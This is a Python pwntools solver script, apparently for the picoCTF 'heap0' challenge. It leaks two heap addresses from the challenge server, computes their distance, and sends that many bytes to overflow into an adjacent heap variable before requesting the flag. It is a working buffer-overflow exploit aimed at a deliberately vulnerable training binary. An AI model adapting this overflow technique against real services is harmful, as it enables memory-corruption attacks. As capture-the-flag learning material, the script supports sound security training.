#!/usr/bin/python3
from pwn import *
import warnings
import os

#run python -m venv my-venv
#cd my-venv
#source my-venv/bin/activate

warnings.filterwarnings('ignore')
context.log_level = 'critical'

fname = '/home/ubuntu/Downloads/heap0/chall' 

LOCAL = False

os.system('clear')

if LOCAL:
  print('Running solver locally..\n')
  r    = process(fname)
  
else:
  IP   = str(sys.argv[1]) if len(sys.argv) >= 2 else 'tethys.picoctf.net'
  PORT = int(sys.argv[2]) if len(sys.argv) >= 3 else 54063
  r    = remote(IP, PORT)
  print(f'Running solver remotely at {IP}:{PORT}\n')

r.recvuntil("--+\n")
r.recvuntil("--+\n")
r.recvuntil("0x")
addressOfPico = r.recvuntil(" ")
addressOfPicoInt = int(addressOfPico.rstrip().decode(),16)

r.recvuntil("0x")
addressOfBico = r.recvuntil(" ")
addressOfBicoInt = int(addressOfBico.rstrip().decode(),16)

r.recvuntil("choice: ")

bufDiff = addressOfBicoInt - addressOfPicoInt

r.sendline("2")
r.recvuntil("buffer: ")
r.sendline("A"*bufDiff)

r.recvuntil("choice: ")
r.sendline("4")
print(r.recv())